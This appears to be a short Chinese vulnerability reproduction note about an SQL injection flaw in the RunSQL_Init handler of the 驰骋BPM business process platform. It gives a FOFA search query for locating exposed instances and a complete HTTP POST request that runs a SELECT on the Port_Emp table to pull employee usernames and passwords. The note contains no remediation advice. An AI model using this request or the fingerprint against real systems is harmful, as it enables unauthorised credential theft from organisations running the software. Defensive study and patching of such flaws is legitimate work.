# 驰骋BPM RunSQL_Init存在SQL注入漏洞

# 一、漏洞简介
驰骋BPM是一款功能强大的业务流程管理平台，可提供可视化的设计界面和灵活的流程配置，帮助企业轻松构建、管理和优化各类业务流程。驰骋BPM RunSQL_Init存在SQL注入漏洞，攻击者可通过该漏洞获取账号密码。

# 二、影响版本
+ 驰骋BPM

# 三、资产测绘
+ fofa`body="/WF/AppClassic/Home.htm"`
+ 特征

![1723125316153-028df4e8-8d0c-4914-95e3-5fce485c6535.png](./img/xmBRbQspfgDUagT5/1723125316153-028df4e8-8d0c-4914-95e3-5fce485c6535-202430.png)

# 四、漏洞复现
```plain
POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 160
Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

------123128312312389898yd98ays98d
Content-Disposition: form-data; name="SQL"

SELECT No,Pass FROM Port_Emp
------123128312312389898yd98ays98d--
```

![1723125347422-b5c92bda-6742-4924-97dd-db99687877ee.png](./img/xmBRbQspfgDUagT5/1723125347422-b5c92bda-6742-4924-97dd-db99687877ee-419982.png)

![1723125358177-e60f1d03-f1e7-44df-801d-aa9dfe0884e2.png](./img/xmBRbQspfgDUagT5/1723125358177-e60f1d03-f1e7-44df-801d-aa9dfe0884e2-311837.png)



> 更新: 2024-08-12 17:15:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lbie8f0kg63bbhee>